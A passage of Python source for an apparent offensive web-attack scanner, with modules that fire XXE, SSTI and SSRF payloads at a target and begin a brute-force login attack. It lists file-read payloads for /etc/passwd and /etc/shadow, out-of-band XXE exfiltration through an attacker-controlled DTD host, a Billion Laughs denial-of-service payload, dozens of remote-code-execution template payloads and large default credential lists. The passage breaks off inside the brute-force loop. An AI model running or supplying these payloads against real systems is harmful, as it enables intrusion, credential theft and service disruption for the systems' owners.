            # Check for SSRF indicators in the response
            # This is highly dependent on how the server processes the request and returns the content.
            # Common indicators: content from internal services, cloud metadata, error messages.
            if "root:x:0:0" in response.text or "aws_access_key_id" in response.text or "metadata.google.internal" in response.text or "instance-id" in response.text or "server: nginx" in response.text.lower() or "server: apache" in response.text.lower():
                vulnerabilities.append({
                    "type": "Server-Side Request Forgery (SSRF)",
                    "severity": "High",
                    "parameter": param_name,
                    "payload": payload,
                    "response_snippet": response.text[:500], # Snippet of the response
                    "poc_code": f"import requests\nrequests.request(method='{method}', url='{target_url}', {{'data=' + str(data) if data else ''}}, {{'headers=' + str(headers) if headers else ''}}, {{'cookies=' + str(cookies) if cookies else ''}}, timeout={timeout}, verify={verify_ssl})" # Placeholder
                })
                print(f"        [!!!] SSRF detected in {param_name}!")
                # Attempt data extraction if cloud metadata is found
                if "aws_access_key_id" in response.text:
                    vulnerabilities[-1]["extracted_content"] = "Found AWS credentials via SSRF."
                elif "metadata.google.internal" in response.text:
                    vulnerabilities[-1]["extracted_content"] = "Found GCP metadata via SSRF."
                elif "root:x:0:0" in response.text:
                    vulnerabilities[-1]["extracted_content"] = "Found /etc/passwd via SSRF."
                
            # Internal port scanning (example, requires more sophisticated logic)
            # This would typically involve trying different ports on internal IPs and analyzing connection errors/banners.
            if any(ip in payload for ip in ["127.0.0.1", "localhost", "10.", "172.16.", "192.168."]) and ("Connection refused" in response.text or "could not connect" in response.text):
                # This is a very basic indicator, a real scan would be more robust.
                vulnerabilities.append({
                    "type": "Server-Side Request Forgery (SSRF) - Internal Port Scan Indicator",
                    "severity": "Medium",
                    "parameter": param_name,
                    "payload": payload,
                    "response_snippet": response.text[:500],
                    "poc_code": f"import requests\nrequests.request(method='{method}', url='{target_url}', {{'data=' + str(data) if data else ''}}, {{'headers=' + str(headers) if headers else ''}}, {{'cookies=' + str(cookies) if cookies else ''}}, timeout={timeout}, verify={verify_ssl})"
                })
                print(f"        [!!!] SSRF (Internal Port Scan Indicator) detected in {param_name}!")

    return vulnerabilities

# --- XXE Module ---

def perform_xxe_attack(target_url, method="POST", data=None, headers=None, cookies=None, timeout=10, verify_ssl=True):
    """
    Performs various XML External Entity (XXE) attacks on the target URL.
    Assumes the target_url expects an XML payload in the request body.

    Args:
        target_url (str): The URL to attack.
        method (str): HTTP method (POST is typical for XML).
        data (str): XML payload string.
        headers (dict): HTTP headers.
        cookies (dict): HTTP cookies.
        timeout (int): Request timeout in seconds.
        verify_ssl (bool): Whether to verify SSL certificates.

    Returns:
        list: A list of dictionaries, each representing a detected vulnerability or information.
    """
    print(f"[+] Starting XXE scan for: {target_url}")
    vulnerabilities = []

    # Common XXE payloads
    xxe_payloads = [
        # Basic XXE for file disclosure (LFI)
        """<?xml version=\"1.0\"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>
<foo>&xxe;</foo>""",
        """<?xml version=\"1.0\"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]>
<foo>&xxe;</foo>""",
        
        # XXE for error-based detection (malformed XML)
        """<?xml version=\"1.0\"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///nonexistent\">]>
<foo>&xxe;</foo>""",
        
        # XXE for OOB (Out-of-Band) interaction (requires attacker-controlled DTD/server)
        # Placeholder for attacker server: ATTACKER_SERVER_IP_OR_DOMAIN
        """<?xml version=\"1.0\"?>
<!DOCTYPE foo [<!ENTITY % remote SYSTEM \"http://ATTACKER_SERVER_IP_OR_DOMAIN/evil.dtd\"> %remote; %int; %trick;]>
<foo>&trick;</foo>""",
        # evil.dtd content (on attacker server):
        # <!ENTITY % file SYSTEM \"file:///etc/passwd\">
        # <!ENTITY % int \"<!ENTITY &#x25; trick SYSTEM 'http://ATTACKER_SERVER_IP_OR_DOMAIN/exfil?data=%file;'>\">\n        
        # XXE for DoS (Billion Laughs Attack)
        """<?xml version=\"1.0\"?>
<!DOCTYPE lolz [
 <!ENTITY lol \"lol\">
 <!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">
 <!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">
 <!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">
 <!ENTITY lol5 \"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\">
 <!ENTITY lol6 \"&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;\">
 <!ENTITY lol7 \"&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;\">
 <!ENTITY lol8 \"&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;\">
 <!ENTITY lol9 \"&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;\">
]>
<lolz>&lol9;</lolz>""",

        # XInclude (if XML parsing supports it)
        """<root xmlns:xi=\"http://www.w3.org/2001/XInclude\">
  <xi:include href=\"file:///etc/passwd\"/>
</root>""",
        
        # SOAP XXE (example, often within a SOAP envelope)
        """<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">
  <soapenv:Header/>
  <soapenv:Body>
    <foo>
      <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>
      <bar>&xxe;</bar>
    </foo>
  </soapenv:Body>
</soapenv:Envelope>""",
        # --- Basic XXE for file disclosure (LFI) (Expanded) ---
        """<?xml version=\"1.0\"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]>
<foo>&xxe;</foo>""",
        """<?xml version=\"1.0\"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hosts\">]>
<foo>&xxe;</foo>""",
        """<?xml version=\"1.0\"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/self/environ\">]>
<foo>&xxe;</foo>""",
        """<?xml version=\"1.0\"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///var/log/apache2/access.log\">]>
<foo>&xxe;</foo>""",
        """<?xml version=\"1.0\"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\">]>
<foo>&xxe;</foo>""",

        # --- XXE for error-based detection (malformed XML) (Expanded) ---
        """<?xml version=\"1.0\"?>
<!DOCTYPE foo [<!ENTITY % remote SYSTEM \"http://nonexistent.com/nonexistent.dtd\"> %remote;]>
<foo>&xxe;</foo>""", # External DTD that doesn't exist

        # --- XXE for OOB (Out-of-Band) interaction (Expanded) ---
        """<?xml version=\"1.0\"?>
<!DOCTYPE foo [<!ENTITY % dtd SYSTEM \"http://ATTACKER_SERVER_IP_OR_DOMAIN/evil.dtd\"> %dtd;]>
<root>&exfil;</root>""", # Simpler OOB with external DTD
        # evil.dtd content: <!ENTITY % payload "<!ENTITY exfil SYSTEM 'file:///etc/passwd'>"> %payload;

        # --- XXE for DoS (Billion Laughs Attack) (Expanded) ---
        """<?xml version=\"1.0\"?>
<!DOCTYPE data [
  <!ENTITY a "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
  <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
  <!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;">
  <!ENTITY f "&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;">
  <!ENTITY g "&f;&f;&f;&f;&f;&f;&f;&f;&f;&f;">
  <!ENTITY h "&g;&g;&g;&g;&g;&g;&g;&g;&g;&g;">
  <!ENTITY i "&h;&h;&h;&h;&h;&h;&h;&h;&h;&h;">
  <!ENTITY j "&i;&i;&i;&i;&i;&i;&i;&i;&i;&i;">
]>
<data>&j;</data>""", # Another Billion Laughs variant

        # --- XInclude (if XML parsing supports it) (Expanded) ---
        """<root xmlns:xi=\"http://www.w3.org/2001/XInclude\">
  <xi:include href=\"file:///c:/windows/win.ini\"/>
</root>""",
        """<root xmlns:xi=\"http://www.w3.org/2001/XInclude\">
  <xi:include href=\"http://ATTACKER_SERVER_IP_OR_DOMAIN/xinclude_test.xml\"/>
</root>""", # XInclude with external URL

        # --- SOAP XXE (example, often within a SOAP envelope) (Expanded) ---
        """<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">
  <soapenv:Header/>
  <soapenv:Body>
    <ns1:method xmlns:ns1=\"http://example.com/\">
      <arg1>
        <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>
        <value>&xxe;</value>
      </arg1>
    </ns1:method>
  </soapenv:Body>
</soapenv:Envelope>""", # SOAP XXE in an argument

        # --- Parameter Entity XXE (New) ---
        """<?xml version=\"1.0\"?>
<!DOCTYPE foo [
  <!ENTITY % param1 SYSTEM \"file:///etc/passwd\">
  <!ENTITY % param2 \"<!ENTITY exfil SYSTEM '%param1;'>\">
  %param2;
]>
<foo>&exfil;</foo>""", # Parameter entity for file disclosure

        # --- Base64 Encoded XXE (New) ---
        """<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"data:text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk\">]>
<foo>&xxe;</foo>""", # Base64 encoded file path

        # --- DTD External Subset (New) ---
        """<?xml version=\"1.0\"?>
<!DOCTYPE foo SYSTEM \"http://ATTACKER_SERVER_IP_OR_DOMAIN/external.dtd\">
<foo>&xxe;</foo>""", # External DTD for OOB
        # external.dtd content: <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]
    # Function to send XML request and check for indicators
    def send_and_check_xxe(payload_xml):
        current_headers = headers.copy() if headers else {}
        current_headers['Content-Type'] = 'application/xml' # Ensure correct content type

        try:
            response = requests.request(method, target_url, data=payload_xml, headers=current_headers, cookies=cookies, timeout=timeout, verify=verify_ssl)
            return response
        except requests.exceptions.RequestException as e:
            print(f"[-] Request failed: {e}")
            return None

    for payload_xml in xxe_payloads:
        print(f"    [>] Trying XXE payload: {payload_xml.splitlines()[0]}...") # Display first line
        response = send_and_check_xxe(payload_xml)

        if response is None:
            continue

        # Check for XXE indicators
        if "root:x:0:0" in response.text or "for 16-bit app support" in response.text.lower():
            vulnerabilities.append({
                "type": "XML External Entity (XXE) - File Disclosure",
                "severity": "High",
                "payload": payload_xml,
                "response_snippet": response.text[:500],
                "poc_code": f"import requests\nrequests.request(method='{method}', url='{target_url}', data='''{payload_xml}''', headers={{'Content-Type': 'application/xml'}}, {'cookies=' + str(cookies) if cookies else ''}, timeout={timeout}, verify={verify_ssl})"
            })
            print(f"        [!!!] XXE (File Disclosure) detected!")
            if "root:x:0:0" in response.text:
                vulnerabilities[-1]["extracted_content"] = "Found /etc/passwd content."
        elif "java.io.FileNotFoundException" in response.text or "failed to open stream" in response.text:
            # This could indicate an error-based XXE, confirming XML parsing
            vulnerabilities.append({
                "type": "XML External Entity (XXE) - Error-based Detection",
                "severity": "Medium",
                "payload": payload_xml,
                "response_snippet": response.text[:500],
                "poc_code": f"import requests\nrequests.request(method='{method}', url='{target_url}', data='''{payload_xml}''', headers={{'Content-Type': 'application/xml'}}, {'cookies=' + str(cookies) if cookies else ''}, timeout={timeout}, verify={verify_ssl})"
            })
            print(f"        [!!!] XXE (Error-based) detected!")
        elif "ATTACKER_SERVER_IP_OR_DOMAIN" in payload_xml:
            # For OOB, we can't directly detect exfiltration here without an actual listener.
            # We just report the attempt.
            vulnerabilities.append({
                "type": "XML External Entity (XXE) - Out-of-Band Attempt",
                "severity": "High",
                "payload": payload_xml,
                "response_snippet": "Check your attacker server logs for incoming requests.",
                "poc_code": f"import requests\nrequests.request(method='{method}', url='{target_url}', data='''{payload_xml}''', headers={{'Content-Type': 'application/xml'}}, {'cookies=' + str(cookies) if cookies else ''}, timeout={timeout}, verify={verify_ssl})"
            })
            print(f"        [!!!] XXE (Out-of-Band) attempt made! Check attacker server logs.")
        elif "lol9" in payload_xml and response.status_code == 500: # Billion Laughs often causes server errors
             vulnerabilities.append({
                "type": "XML External Entity (XXE) - Denial of Service (Billion Laughs)",
                "severity": "High",
                "payload": payload_xml,
                "response_snippet": response.text[:500],
                "poc_code": f"import requests\nrequests.request(method='{method}', url='{target_url}', data='''{payload_xml}''', headers={{'Content-Type': 'application/xml'}}, {'cookies=' + str(cookies) if cookies else ''}, timeout={timeout}, verify={verify_ssl})"
            })
             print(f"        [!!!] XXE (Denial of Service) detected!")

    return vulnerabilities

# --- SSTI Module ---

def perform_ssti_attack(target_url, method="GET", data=None, headers=None, cookies=None, timeout=10, verify_ssl=True):
    """
    Performs various Server-Side Template Injection (SSTI) attacks on the target URL.

    Args:
        target_url (str): The URL to attack.
        method (str): HTTP method (GET or POST).
        data (dict): POST data.
        headers (dict): HTTP headers.
        cookies (dict): HTTP cookies.
        timeout (int): Request timeout in seconds.
        verify_ssl (bool): Whether to verify SSL certificates.

    Returns:
        list: A list of dictionaries, each representing a detected vulnerability or information.
    """
    print(f"[+] Starting SSTI scan for: {target_url}")
    vulnerabilities = []

    ssti_payloads = [
        # Jinja2 / Twig
        "{{2*2}}", # Basic math
        "{{self.__class__.__bases__[0].__subclasses__()[40]('id').read()}}", # Python RCE (example index)
        "{{config.items()}}", # Flask config disclosure
        "{{_self.env.execute('id')}}", # Twig RCE
        
        # Freemarker
        "${2*2}",
        "<#assign ex='freemarker.template.utility.Execute'?new()> ${ ex('id') }", # RCE
        
        # Velocity
        "#set($x=$request.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('id'))", # RCE
        
        # ERB (Ruby)
        "<%= `id` %>", # RCE
        "<%= system('id') %>", # RCE
        
        # Smarty
        "{system('id')}", # RCE
        "{php}echo `id`;{/php}", # RCE
        
        # Pug/Jade (Node.js)
        "#{'id'}", # Basic interpolation
        "#{process.mainModule.require('child_process').execSync('id')}", # RCE
        
        # Handlebars (Node.js)
        "{{lookup (lookup this 'constructor') 'getOwnPropertyNames' (lookup this 'constructor')}}", # Info disclosure
        
        # Generic command execution payloads (try to detect output)
        "{{system('id')}}",
        "{{`id`}}",
        "${system('id')}",
        "#{'id'}",
        "<%= `id` %>",
        # Jinja2 / Twig (Expanded)
        "{{ ''.__class__.__mro__[1].__subclasses__()[40]('id').read() }}", # Jinja2 RCE (common variant)
        "{{ cycler.__class__.__init__.__globals__.os.popen('id').read() }}", # Jinja2 RCE (another variant)
        "{{ g.__class__.__base__.__subclasses__()[10].__init__.__globals__['os'].popen('id').read() }}", # Jinja2 RCE (flask specific, needs index fuzzing)
        "{{ [].__class__.__base__.__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__(\\'os\\').popen(\\'id\\').read()') }}", # Jinja2 eval RCE (needs index fuzzing)
        "{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}", # Jinja2/Flask RCE
        "{{_ENV.get('SHELL', 'N/A')}}", # Twig info disclosure
        "{{_context._vars.app.request.server.all()}}", # Twig config disclosure

        # Freemarker (Expanded)
        "<#assign command='id'> <#assign ex=ex?new()> ${ex(command)}", # RCE variant
        "${'bash'?eval(id)}", # RCE variant
        "${T.java.lang.System.getProperty('user.dir')}", # Java system property
        "${.vars?keys}", # Variable enumeration

        # Velocity (Expanded)
        "#set($e = $runtime.getRuntime().exec(\"id\"))", # RCE variant
        "#set($str = $e.getInputStream().readAllBytes())", # RCE variant
        "$class.forname(\"java.lang.Runtime\").getMethods().get(6).invoke($class.forname(\"java.lang.Runtime\").getMethods().get(8).invoke(null),\"id\")", # RCE without #set

        # ERB (Ruby) (Expanded)
        "<%= %x(id) %>", # RCE variant
        "<%= IO.popen('id').read %>", # RCE variant
        "<%= require 'open3'; Open3.capture2('id') %>", # RCE variant

        # Smarty (Expanded)
        "{{/bin/bash -c id}}", # RCE variant (if template allows shell exec)
        "{literal}{/literal}{system('id')}", # Sandbox bypass

        # Pug/Jade (Node.js) (Expanded)
        "#{global.process.mainModule.require('child_process').execSync('id').toString()}", # RCE variant
        "#[process.env]", # Environment variable disclosure

        # Handlebars (Node.js) (Expanded)
        "{{this.constructor.FUNTION_NAME}}", # Property access (needs fuzzing)
        "{{this.__proto__.lookupProperty(\"constructor\").call(global, \"return process.mainModule.require('child_process').execSync('id')\")()}}", # RCE (complex)

        # Thymeleaf (Java) (New)
        "__${T(java.lang.Runtime).getRuntime().exec('id')}__", # RCE
        "__${T(java.lang.System).getProperty('user.home')}__", # Info disclosure

        # Twig (PHP) (Expanded from existing ideas)
        "{{_self.env.getCompilerClass().newInstance().getTest(\"id\").compile()}}", # RCE
        "{{_self.env.loadTemplate('{% set command=\"id\" %}{{command|e}}').render()}}", # RCE
        "{{app.request.server.all}}", # Info disclosure

        # Mako (Python) (New)
        "${ self.module.cache.set('foo', self.module.cache.get('bar').x.x.x.os.popen('id').read() ) }", # RCE (needs path fuzzing)
        "${ ''.__class__.__mro__[-1].__subclasses__()[-1].__init__.__globals__['os'].popen('id').read() }", # RCE

        # Flask/Jinja2 (Python) (Expanded from existing ideas)
        "{{ ''.__class__.__mro__[2].__subclasses__()[_].__init__.__globals__['os'].popen('id').read() }}", # RCE (needs index fuzzing)
        "{{ ''.__class__.__base__.__subclasses__()[_].__init__.__globals__['os'].popen('id').read() }}", # RCE (needs index fuzzing)
        r"{{ request.__class__.__init__.__globals__['os'].popen('id').read() }}", # Flask/Jinja2 RCE
        r"{{ self._TemplateReference__context.joiner.__init__.__globals__['os'].popen('id').read() }}", # Flask/Jinja2 RCE

        # ASP.NET Razor (C#) (New)
        "@System.Diagnostics.Process.Start(\"cmd.exe\", \"/c id\")", # RCE
        "@System.IO.File.ReadAllText(\"c:\\windows\\win.ini\")", # File read

        # Go Template (New)
        "{{. | call .exec \"id\"}}", # RCE (if exec function is available)
        "{{. | call .file \"/etc/passwd\"}}", # File read

        # Spring EL (Java) (New)
        "${T(java.lang.Runtime).getRuntime().exec(\"id\")}", # RCE
        "#{new java.lang.ProcessBuilder(\"id\").start()}", # RCE alternative

        # Mustache (JS/Ruby/PHP/Java) (Often logic-less, but try some basic info disclosure)
        "{{.}}", # Self-reflection
        "{{{_context.data}}}", # Debug info

        # Generic command execution payloads (try to detect output) (Expanded)
        "{{'id'|e}}", # Twig
        "{{'id'|execute}}", # Placeholder
        "[[id]]", # Some custom template engines
        "{{exec('id')}}",
        "{{shell_exec('id')}}",
    ]
    # Function to send request and check for SSTI indicators
    def send_and_check_ssti(payload_value, param_name):
        current_data = data.copy() if data else {}
        current_headers = headers.copy() if headers else {}
        current_cookies = cookies.copy() if cookies else {}

        if method == "GET":
            test_url = f"{target_url}?{param_name}={quote_plus(payload_value)}"
            try:
                response = requests.get(test_url, headers=current_headers, cookies=current_cookies, timeout=timeout, verify=verify_ssl)
                return response
            except requests.exceptions.RequestException as e:
                print(f"[-] Request failed: {e}")
                return None
        elif method == "POST":
            current_data[param_name] = payload_value
            try:
                response = requests.post(target_url, data=current_data, headers=current_headers, cookies=current_cookies, timeout=timeout, verify=verify_ssl)
                return response
            except requests.exceptions.RequestException as e:
                print(f"[-] Request failed: {e}")
                return None
        return None

    # Identify injectable parameters (simplified for now)
    parameters_to_test = ['name', 'query', 'message', 'id'] # Placeholder, should be dynamically discovered

    for param_name in parameters_to_test:
        print(f"[*] Testing parameter: {param_name}")

        for payload in ssti_payloads:
            print(f"    [>] Trying SSTI payload: {payload[:50]}...") # Truncate long payloads for display
            response = send_and_check_ssti(payload, param_name)

            if response is None:
                continue

            # Check for SSTI indicators
            # Basic math evaluation (e.g., 2*2 = 4)
            if "4" in response.text and ("{{2*2}}" in payload or "${2*2}" in payload):
                vulnerabilities.append({
                    "type": "Server-Side Template Injection (SSTI) - Basic Math",
                    "severity": "Medium",
                    "parameter": param_name,
                    "payload": payload,
                    "response_snippet": response.text[:500],
                    "poc_code": f"import requests\nrequests.request(method='{method}', url='{target_url}', {{'data=' + str(data) if data else ''}}, {{'headers=' + str(headers) if headers else ''}}, {{'cookies=' + str(cookies) if cookies else ''}}, timeout={timeout}, verify={verify_ssl})"
                })
                print(f"        [!!!] SSTI (Basic Math) detected in {param_name}!")
            
            # Command execution output (e.g., 'uid=', 'gid=', 'root', 'bin')
            if any(cmd_output in response.text for cmd_output in ["uid=", "gid=", "root", "bin", "daemon", "nobody"]):
                vulnerabilities.append({
                    "type": "Server-Side Template Injection (SSTI) - Command Execution",
                    "severity": "Critical",
                    "parameter": param_name,
                    "payload": payload,
                    "response_snippet": response.text[:500],
                    "poc_code": f"import requests\nrequests.request(method='{method}', url='{target_url}', {{'data=' + str(data) if data else ''}}, {{'headers=' + str(headers) if headers else ''}}, {{'cookies=' + str(cookies) if cookies else ''}}, timeout={timeout}, verify={verify_ssl})"
                })
                print(f"        [!!!] SSTI (Command Execution) detected in {param_name}!")
                # Attempt to extract command output
                match = re.search(r"(uid=\d+\(.*?\))", response.text) # Example for 'id' command
                if match:
                    vulnerabilities[-1]["extracted_output"] = match.group(1)
                
            # Information disclosure (e.g., config items)
            if "config.items()" in payload and ("SECRET_KEY" in response.text or "DATABASE_URL" in response.text):
                vulnerabilities.append({
                    "type": "Server-Side Template Injection (SSTI) - Information Disclosure",
                    "severity": "High",
                    "parameter": param_name,
                    "payload": payload,
                    "response_snippet": response.text[:500],
                    "poc_code": f"import requests\nrequests.request(method='{method}', url='{target_url}', {{'data=' + str(data) if data else ''}}, {{'headers=' + str(headers) if headers else ''}}, {{'cookies=' + str(cookies) if cookies else ''}}, timeout={timeout}, verify={verify_ssl})"
                })
                print(f"        [!!!] SSTI (Information Disclosure) detected in {param_name}!")

    return vulnerabilities

# --- Brute Force Login Module ---

def perform_brute_force_login(target_url, login_path, username_field, password_field, success_indicator, method="POST", usernames=None, passwords=None, headers=None, cookies=None, timeout=10, verify_ssl=True):
    """
    Performs brute-force login attempts on a target URL.

    Args:
        target_url (str): The base URL of the application.
        login_path (str): The path to the login endpoint (e.g., "/login.php").
        username_field (str): The name of the username input field.
        password_field (str): The name of the password input field.
        success_indicator (str): A string that indicates a successful login in the response body.
        method (str): HTTP method (POST or GET).
        usernames (list): List of usernames to try. If None, uses default.
        passwords (list): List of passwords to try. If None, uses default.
        headers (dict): HTTP headers.
        cookies (dict): HTTP cookies.
        timeout (int): Request timeout in seconds.
        verify_ssl (bool): Whether to verify SSL certificates.

    Returns:
        list: A list of dictionaries, each representing a detected successful login or information.
    """
    print(f"[+] Starting Brute Force Login scan for: {target_url}{login_path}")
    vulnerabilities = []

    default_usernames = [
        "admin", "user", "test", "root", "administrator", "guest", "support", "info",
        "webmaster", "sysadmin", "manager", "operator", "security", "dev", "ftp", "ssh",
        "ubuntu", "pi", "elastic", "postgres", "mysql", "oracle", "sa", "superadmin",
        "service", "backup", "monitor", "guest", "testuser", "testadmin", "developer",
        "john", "jane", "user1", "user2", "admin1", "admin2", "test1", "test2",
        "dbadmin", "appadmin", "webadmin", "sys", "system", "operator", "poweruser",
        "guestuser", "anonymous", "default", "changeme", "welcome", "user_name",
        "username", "login", "account", "master", "root", "toor", "admin_user",
        "admin_test", "admin_dev", "admin_prod", "admin_stage", "admin_qa",
        "admin_support", "admin_guest", "admin_info", "admin_web", "admin_sys",
        "admin_manager", "admin_operator", "admin_security", "admin_ftp", "admin_ssh",
        "admin_ubuntu", "admin_pi", "admin_elastic", "admin_postgres", "admin_mysql",
        "admin_oracle", "admin_sa", "admin_superadmin", "admin_service", "admin_backup",
        "admin_monitor", "admin_testuser", "admin_testadmin", "admin_developer",
        "admin_john", "admin_jane", "admin_user1", "admin_user2", "admin_admin1",
        "admin_admin2", "admin_test1", "admin_test2", "admin_dbadmin", "admin_appadmin",
        "admin_webadmin", "admin_sys", "admin_system", "admin_operator", "admin_poweruser",
        "admin_guestuser", "admin_anonymous", "admin_default", "admin_changeme",
        "admin_welcome", "admin_user_name", "admin_username", "admin_login",
        "admin_account", "admin_master", "admin_root", "admin_toor",
    ]
    default_passwords = [
        "password", "123456", "admin", "12345678", "qwerty", "123456789", "12345", "1234",
        "test", "welcome", "changeme", "access", "guest", "root", "toor", "admin123",
        "user123", "default", "password123", "secret", "master", "login", "pass",
        str(datetime.now().year), str(datetime.now().year - 1), str(datetime.now().year + 1),
        "Password", "P@ssword", "P@55w0rd", "1qaz@WSX", "QWERTY", "adminadmin", "admin@123",
        "1234567", "1234567890", "123qweasd", "test1234", "iloveyou", "company", "football",
        "sunshine", "raspberry", "tomcat", "jboss", "oracle", "postgres", "mysql", "mssql",
        "admin1", "admin2", "admin01", "admin02", "test1", "test2", "test01", "test02",
        "guest1", "guest2", "guest01", "guest02", "support1", "support2", "support01",
        "support02", "info1", "info2", "info01", "info02", "webmaster1", "webmaster2",
        "webmaster01", "webmaster02", "sysadmin1", "sysadmin2", "sysadmin01", "sysadmin02",
        "manager1", "manager2", "manager01", "manager02", "operator1", "operator2",
        "operator01", "operator02", "security1", "security2", "security01", "security02",
        "dev1", "dev2", "dev01", "dev02", "ftp1", "ftp2", "ftp01", "ftp02", "ssh1", "ssh2",
        "ssh01", "ssh02", "ubuntu1", "ubuntu2", "ubuntu01", "ubuntu02", "pi1", "pi2",
        "pi01", "pi02", "elastic1", "elastic2", "elastic01", "elastic02", "postgres1",
        "postgres2", "postgres01", "postgres02", "mysql1", "mysql2", "mysql01", "mysql02",
        "oracle1", "oracle2", "oracle01", "oracle02", "sa1", "sa2", "sa01", "sa02",
        "superadmin1", "superadmin2", "superadmin01", "superadmin02", "service1",
        "service2", "service01", "service02", "backup1", "backup2", "backup01",
        "backup02", "monitor1", "monitor2", "monitor01", "monitor02", "testuser1",
        "testuser2", "testuser01", "testuser02", "testadmin1", "testadmin2",
        "testadmin01", "testadmin02", "developer1", "developer2", "developer01",
        "developer02", "john1", "john2", "john01", "john02", "jane1", "jane2",
        "jane01", "jane02", "user_name1", "user_name2", "user_name01", "user_name02",
        "username1", "username2", "username01", "username02", "login1", "login2",
        "login01", "login02", "account1", "account2", "account01", "account02",
        "master1", "master2", "master01", "master02", "root1", "root2", "root01",
        "root02", "toor1", "toor2", "toor01", "toor02", "admin_user1", "admin_user2",
        "admin_user01", "admin_user02", "admin_test1", "admin_test2", "admin_test01",
        "admin_test02", "admin_dev1", "admin_dev2", "admin_dev01", "admin_dev02",
        "admin_prod1", "admin_prod2", "admin_prod01", "admin_prod02", "admin_stage1",
        "admin_stage2", "admin_stage01", "admin_stage02", "admin_qa1", "admin_qa2",
        "admin_qa01", "admin_qa02", "admin_support1", "admin_support2", "admin_support01",
        "admin_support02", "admin_guest1", "admin_guest2", "admin_guest01", "admin_guest02",
        "admin_info1", "admin_info2", "admin_info01", "admin_info02", "admin_web1",
        "admin_web2", "admin_web01", "admin_web02", "admin_sys1", "admin_sys2",
        "admin_sys01", "admin_sys02", "admin_manager1", "admin_manager2",
        "admin_manager01", "admin_manager02", "admin_operator1", "admin_operator2",
        "admin_operator01", "admin_operator02", "admin_security1", "admin_security2",
        "admin_security01", "admin_security02", "admin_dev1", "admin_dev2",
        "admin_dev01", "admin_dev02", "admin_ftp1", "admin_ftp2",
        "admin_ftp01", "admin_ftp02", "admin_ssh1", "admin_ssh2", "admin_ssh01",
        "admin_ssh02", "admin_ubuntu1", "admin_ubuntu2", "admin_ubuntu01",
        "admin_ubuntu02", "admin_pi1", "admin_pi2", "admin_pi01", "admin_pi02",
        "admin_elastic1", "admin_elastic2", "admin_elastic01", "admin_elastic02",
        "admin_postgres1", "admin_postgres2", "admin_postgres01", "admin_postgres02",
        "admin_mysql1", "admin_mysql2", "admin_mysql01", "admin_mysql02",
        "admin_oracle1", "admin_oracle2", "admin_oracle01", "admin_oracle02",
        "admin_sa1", "admin_sa2", "admin_sa01", "admin_sa02", "admin_superadmin1",
        "admin_superadmin2", "admin_superadmin01", "admin_superadmin02",
        "admin_service1", "admin_service2", "admin_service01", "admin_service02",
        "admin_backup1", "admin_backup2", "admin_backup01", "admin_backup02",
        "admin_monitor1", "admin_monitor2", "admin_monitor01", "admin_monitor02",
        "admin_testuser1", "admin_testuser2", "admin_testuser01", "admin_testuser02",
        "admin_testadmin1", "admin_testadmin2", "admin_testadmin01", "admin_testadmin02",
        "admin_developer1", "admin_developer2", "admin_developer01", "admin_developer02",
        "admin_john1", "admin_john2", "admin_john01", "admin_john02", "admin_jane1",
        "admin_jane2", "admin_jane01", "admin_jane02", "admin_user_name1",
        "admin_user_name2", "admin_user_name01", "admin_user_name02", "admin_username1",
        "admin_username2", "admin_username01", "admin_username02", "admin_login1",
        "admin_login2", "admin_login01", "admin_login02", "admin_account1",
        "admin_account2", "admin_account01", "admin_account02", "admin_master1",
        "admin_master2", "admin_master01", "admin_master02", "admin_root1",
        "admin_root2", "admin_root01", "admin_root02", "admin_toor1", "admin_toor2",
        "admin_toor01", "admin_toor02",
    ]

    usernames_to_try = usernames if usernames else default_usernames
    passwords_to_try = passwords if passwords else default_passwords

    login_url = f"{target_url}{login_path}"

    # Simple rate limiting/account lockout detection (can be expanded)
    failed_attempts = 0
    last_attempt_time = time.time()
    rate_limit_threshold = 5 # Max failed attempts before a short pause
    rate_limit_pause = 5 # seconds

    for username in usernames_to_try:
        for password in passwords_to_try:
            current_data = {
                username_field: username,
                password_field: password
            }
            current_headers = headers.copy() if headers else {}
            current_cookies = cookies.copy() if cookies else {}

